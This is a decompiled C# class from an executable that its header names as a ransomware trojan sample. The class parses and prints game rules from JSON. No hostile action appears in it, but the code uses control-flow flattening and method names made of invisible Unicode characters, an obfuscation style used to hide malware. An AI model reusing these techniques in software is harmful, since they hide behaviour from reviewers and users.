// Decompiled with JetBrains decompiler
// Type: Cytotechnologist.Rules
// Assembly: SessionMa, Version=2.0.4.0, Culture=neutral, PublicKeyToken=null
// MVID: 29EA69E7-0E4F-4884-A9FC-633229D6DF5B
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.02-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-c4ce569311f22121bf069cebfeb39abebfd9109cf9a147e550f8801c49529685.exe

using SimpleJSON;
using System;
using System.Collections.Generic;
using System.Globalization;
using System.Runtime.InteropServices;

namespace Cytotechnologist
{
  public class Rules
  {
    public int SprintCount { get; private set; }

    public int MaxImpact { get; private set; }

    public Card[] Cards { get; private set; }

    public int InitialResources { get; private set; }

    public int NormalPlanningCount { get; private set; }

    public int NormalPlanningCost { get; private set; }

    public int OverPlanningCost { get; private set; }

    public int SprintsWonWithoutPlanning { get; private set; }

    public float[] RiskChances { get; private set; }

    public bool EconomicsAffectsAll { get; private set; }

    public int StayOnSprintMinDiff { get; private set; }

    public bool OnlyOneWinner { get; private set; }

    private Rules()
    {
    }

    public static Rules Deserialize(JSONNode json)
    {
label_1:
      int num1 = -842449334;
      Rules rules;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -1427705325)) % 4U)
        {
          case 0:
            num1 = (int) num2 * -1881932175 ^ -1479950163;
            continue;
          case 1:
            int asInt = json["max-impact"].AsInt;
            rules = new Rules()
            {
              SprintCount = json["sprints"].AsInt,
              MaxImpact = asInt,
              Cards = Rules.ParseDeck(json["deck"], asInt),
              InitialResources = json["initial-resources"].AsInt,
              NormalPlanningCount = json["normal-planning-count"].AsInt,
              NormalPlanningCost = json["normal-planning-cost"].AsInt,
              OverPlanningCost = json["over-planning-cost"].AsInt,
              SprintsWonWithoutPlanning = json["sprints-won-without-planning"].AsInt,
              RiskChances = Rules.ParseRiskChances(json["risk-chances"]),
              EconomicsAffectsAll = json["economics-affects-all"].AsBool,
              StayOnSprintMinDiff = json["stay-on-sprint-min-diff"].AsInt,
              OnlyOneWinner = json["only-one-winner"].AsBool
            };
            num1 = (int) num2 * 2002122253 ^ -8460094;
            continue;
          case 3:
            goto label_1;
          default:
            goto label_5;
        }
      }
label_5:
      return rules;
    }

    private static float[] ParseRiskChances(JSONNode json)
    {
label_1:
      int num1 = 2032894762;
      float[] numArray;
      int aIndex;
      float[] riskChances;
      bool flag;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 749244939)) % 8U)
        {
          case 1:
            numArray = new float[json.Count];
            aIndex = 0;
            num1 = (int) num2 * 1047261229 ^ 1273178200;
            continue;
          case 2:
            riskChances = numArray;
            num1 = (int) num2 * 640322411 ^ 245308757;
            continue;
          case 3:
            ++aIndex;
            num1 = (int) num2 * -1605947718 ^ 1932022411;
            continue;
          case 4:
            goto label_1;
          case 5:
            numArray[aIndex] = json[aIndex].AsFloat;
            num1 = 1217494096;
            continue;
          case 6:
            flag = aIndex < numArray.Length;
            num1 = 1437232876;
            continue;
          case 7:
            int num3 = !flag ? -1281002195 : (num3 = -1840531918);
            num1 = num3 ^ (int) num2 * 1671361484;
            continue;
          default:
            goto label_9;
        }
      }
label_9:
      return riskChances;
    }

    private static Card[] ParseDeck(JSONNode json, int maxImpact)
    {
      int count = json.Count;
      List<Card> cardList = new List<Card>();
label_1:
      int num1 = -1015599486;
      int num2;
      JSONNode jsonNode;
      int aIndex1;
      bool flag1;
      bool flag2;
      int aIndex2;
      bool flag3;
      bool flag4;
      Card[] array;
      while (true)
      {
        uint num3;
        switch ((num3 = (uint) (num1 ^ -817359031)) % 26U)
        {
          case 0:
            cardList.Add(new Card()
            {
              Impact = flag2 ? -(maxImpact - aIndex1) : maxImpact * 2 - aIndex1,
              Type = aIndex2
            });
            num1 = -2047364410;
            continue;
          case 1:
            num1 = -1882083155;
            continue;
          case 2:
            num1 = (int) num3 * -1883138869 ^ -496420392;
            continue;
          case 3:
            num1 = -320992422;
            continue;
          case 4:
            aIndex1 = 0;
            num1 = (int) num3 * -94093674 ^ 732428336;
            continue;
          case 5:
            num1 = (int) num3 * -494240458 ^ -1447343643;
            continue;
          case 6:
            num1 = (int) num3 * -570013677 ^ 35452253;
            continue;
          case 7:
            aIndex2 = 0;
            num1 = (int) num3 * -1649848601 ^ 1394352634;
            continue;
          case 8:
            ++num2;
            num1 = (int) num3 * 706273597 ^ 656160404;
            continue;
          case 9:
            flag4 = aIndex2 < count;
            num1 = -933223663;
            continue;
          case 10:
            ++aIndex1;
            num1 = (int) num3 * -1564901017 ^ 1314225526;
            continue;
          case 11:
            flag3 = aIndex1 < maxImpact * 2;
            num1 = -2094681614;
            continue;
          case 12:
            num1 = (int) num3 * -1693606304 ^ 962891296;
            continue;
          case 13:
            num1 = (int) num3 * 1912366530 ^ -897665739;
            continue;
          case 14:
            array = cardList.ToArray();
            num1 = (int) num3 * -826490963 ^ -987206532;
            continue;
          case 15:
            flag2 = aIndex1 < maxImpact;
            num1 = (int) num3 * 70144551 ^ 1279548080;
            continue;
          case 16:
            ++aIndex2;
            num1 = (int) num3 * 679866722 ^ 517436048;
            continue;
          case 17:
            int num4 = flag3 ? -1401515673 : (num4 = -624860320);
            num1 = num4 ^ (int) num3 * -473838953;
            continue;
          case 18:
            jsonNode = json[aIndex2];
            num1 = (int) num3 * -1769481734 ^ -2041853497;
            continue;
          case 20:
            int num5 = flag4 ? 520880710 : (num5 = 1766973037);
            num1 = num5 ^ (int) num3 * -1047247357;
            continue;
          case 21:
            goto label_1;
          case 22:
            num2 = 0;
            num1 = (int) num3 * 1271779730 ^ 1801975371;
            continue;
          case 23:
            num1 = -1098135063;
            continue;
          case 24:
            int num6 = !flag1 ? -962063512 : (num6 = -410470316);
            num1 = num6 ^ (int) num3 * -1410736383;
            continue;
          case 25:
            flag1 = num2 < jsonNode[aIndex1].AsInt;
            num1 = -889019525;
            continue;
          default:
            goto label_27;
        }
      }
label_27:
      return array;
    }

    public override string ToString()
    {
      string str = Rules.\u202B⁫‮‌⁭‭‎⁫‭‮‎‭‏‏⁬⁬⁯​⁬​‍‭‌‬⁪‫⁮‭‍‬‬‍‬⁬⁪‍‎‭‫‭‮("sprints: {0},\nmax-impact:{1},\ndeck: \n{2},\n\ninitial-resources: {3},\n\nnormal-planning-count: {4},\nnormal-planning-cost: {5},\nover-planning-cost: {6},\nsprints-won-without-planning: {7},\n\nrisk-chances: {8},\n\neconomics-affects-all: {9},\nstay-on-sprint-min-diff: {10},\nonly-one-winner: {11}", new object[12]
      {
        (object) this.SprintCount,
        (object) this.MaxImpact,
        (object) this.CardsToString(),
        (object) this.InitialResources,
        (object) this.NormalPlanningCount,
        (object) this.NormalPlanningCost,
        (object) this.OverPlanningCost,
        (object) this.SprintsWonWithoutPlanning,
        (object) this.RiskChancesToString(),
        (object) this.EconomicsAffectsAll,
        (object) this.StayOnSprintMinDiff,
        (object) this.OnlyOneWinner
      });
label_1:
      int num1 = 126542711;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 269974352)) % 3U)
        {
          case 0:
            goto label_1;
          case 2:
            num1 = (int) num2 * -201971011 ^ -733200258;
            continue;
          default:
            goto label_4;
        }
      }
label_4:
      return str;
    }

    private string CardsToString()
    {
label_1:
      int num1 = -2478800;
      string str1;
      int num2;
      Card card1;
      Card[] cards;
      string str2;
      int index;
      while (true)
      {
        uint num3;
        switch ((num3 = (uint) (num1 ^ -230951649)) % 19U)
        {
          case 0:
            goto label_1;
          case 2:
            index = 0;
            num1 = (int) num3 * 131867572 ^ 1157883909;
            continue;
          case 3:
            num2 = card1.Type;
            num1 = (int) num3 * -1551482651 ^ 630078837;
            continue;
          case 4:
            num1 = (int) num3 * -199927925 ^ -154348861;
            continue;
          case 5:
            num1 = (int) num3 * -60941852 ^ -971401681;
            continue;
          case 6:
            num1 = (int) num3 * 1612423139 ^ -860092504;
            continue;
          case 7:
            card1 = cards[index];
            num1 = -583962574;
            continue;
          case 8:
            str1 = Rules.\u206F⁪⁭⁪‌‭⁭‌‪‍⁫⁪‏‎⁭⁬‫⁪‬‭‫​‍⁭‮⁫⁯‏‍‭⁪‌⁪‭⁭‭‫​⁭⁬‮(str1, "\n\t");
            num1 = (int) num3 * 209260187 ^ -960134746;
            continue;
          case 9:
            ++index;
            num1 = (int) num3 * 799081209 ^ -1003106431;
            continue;
          case 10:
            num1 = (int) num3 * 1951982935 ^ 1430815850;
            continue;
          case 11:
            str2 = Rules.\u206F⁪⁭⁪‌‭⁭‌‪‍⁫⁪‏‎⁭⁬‫⁪‬‭‫​‍⁭‮⁫⁯‏‍‭⁪‌⁪‭⁭‭‫​⁭⁬‮(str1, "\n]");
            num1 = (int) num3 * -1029833422 ^ -1670741879;
            continue;
          case 12:
            num1 = (int) num3 * -2109378654 ^ -1548376120;
            continue;
          case 13:
            cards = this.Cards;
            num1 = (int) num3 * 1333923273 ^ 279975190;
            continue;
          case 14:
            int num4 = num2 != card1.Type ? -970075371 : (num4 = -1948533232);
            num1 = num4 ^ (int) num3 * -451416860;
            continue;
          case 15:
            str1 = "[\n\t";
            num1 = (int) num3 * -823533362 ^ -976929394;
            continue;
          case 16:
            num2 = 0;
            num1 = (int) num3 * 1748921296 ^ 123115710;
            continue;
          case 17:
            string str3 = str1;
            Card card2 = card1;
            string str4 = card2 != null ? Rules.\u202C‮‬⁯⁫⁬‏⁮‎⁭‮‮‪‏⁭‭⁫‬⁫⁯⁯‫⁬‏⁮⁭‪‬⁫⁭⁯⁪‫‎‎⁫‎‫‬‌‮((object) card2) : (string) null;
            str1 = Rules.\u200B⁮⁪⁫‬‮​⁬‍‪​⁯‭⁪⁮‌‌‏⁫‌‎‍⁯⁯‬⁮⁪⁬‍⁭‎⁭‍​⁯⁭⁬⁮‍⁫‮(str3, str4, " ");
            num1 = -51991614;
            continue;
          case 18:
            int num5;
            num1 = num5 = index < cards.Length ? -1750709587 : (num5 = -317453960);
            continue;
          default:
            goto label_20;
        }
      }
label_20:
      return str2;
    }

    private string RiskChancesToString()
    {
label_1:
      int num1 = 3426105;
      string str1;
      int index;
      bool flag;
      string str2;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 1407299882)) % 8U)
        {
          case 0:
            str2 = Rules.\u206F⁪⁭⁪‌‭⁭‌‪‍⁫⁪‏‎⁭⁬‫⁪‬‭‫​‍⁭‮⁫⁯‏‍‭⁪‌⁪‭⁭‭‫​⁭⁬‮(str1, " ]");
            num1 = (int) num2 * 58512220 ^ -1605424090;
            continue;
          case 1:
            ++index;
            num1 = (int) num2 * 1343182421 ^ 1972129424;
            continue;
          case 2:
            str1 = Rules.\u200B⁮⁪⁫‬‮​⁬‍‪​⁯‭⁪⁮‌‌‏⁫‌‎‍⁯⁯‬⁮⁪⁬‍⁭‎⁭‍​⁯⁭⁬⁮‍⁫‮(str1, ", ", this.RiskChances[index].ToString((IFormatProvider) Rules.\u202D‬⁭‬‎‭‪⁭‍‫⁫‭‪‬‬⁪⁬‬‮⁭‌‎‮‭⁫‫‎​‏⁯‌⁫‫⁭⁯⁮‫‍‭‮()));
            num1 = 97598315;
            continue;
          case 3:
            str1 = Rules.\u206F⁪⁭⁪‌‭⁭‌‪‍⁫⁪‏‎⁭⁬‫⁪‬‭‫​‍⁭‮⁫⁯‏‍‭⁪‌⁪‭⁭‭‫​⁭⁬‮("[ ", this.RiskChances[0].ToString((IFormatProvider) Rules.\u202D‬⁭‬‎‭‪⁭‍‫⁫‭‪‬‬⁪⁬‬‮⁭‌‎‮‭⁫‫‎​‏⁯‌⁫‫⁭⁯⁮‫‍‭‮()));
            index = 1;
            num1 = (int) num2 * 837759678 ^ 1112255263;
            continue;
          case 5:
            int num3 = !flag ? -14509095 : (num3 = -30405);
            num1 = num3 ^ (int) num2 * -552626721;
            continue;
          case 6:
            goto label_1;
          case 7:
            flag = index < this.RiskChances.Length;
            num1 = 1059291151;
            continue;
          default:
            goto label_9;
        }
      }
label_9:
      return str2;
    }

    static string \u202B⁫‮‌⁭‭‎⁫‭‮‎‭‏‏⁬⁬⁯​⁬​‍‭‌‬⁪‫⁮‭‍‬‬‍‬⁬⁪‍‎‭‫‭‮([In] string obj0, [In] object[] obj1) => string.Format(obj0, obj1);

    static string \u206F⁪⁭⁪‌‭⁭‌‪‍⁫⁪‏‎⁭⁬‫⁪‬‭‫​‍⁭‮⁫⁯‏‍‭⁪‌⁪‭⁭‭‫​⁭⁬‮([In] string obj0, [In] string obj1) => obj0 + obj1;

    static string \u202C‮‬⁯⁫⁬‏⁮‎⁭‮‮‪‏⁭‭⁫‬⁫⁯⁯‫⁬‏⁮⁭‪‬⁫⁭⁯⁪‫‎‎⁫‎‫‬‌‮([In] object obj0) => obj0.ToString();

    static string \u200B⁮⁪⁫‬‮​⁬‍‪​⁯‭⁪⁮‌‌‏⁫‌‎‍⁯⁯‬⁮⁪⁬‍⁭‎⁭‍​⁯⁭⁬⁮‍⁫‮(
      [In] string obj0,
      [In] string obj1,
      [In] string obj2)
    {
      return obj0 + obj1 + obj2;
    }

    static CultureInfo \u202D‬⁭‬‎‭‪⁭‍‫⁫‭‪‬‬⁪⁬‬‮⁭‌‎‮‭⁫‫‎​‏⁯‌⁫‫⁭⁯⁮‫‍‭‮() => CultureInfo.InvariantCulture;
  }
}
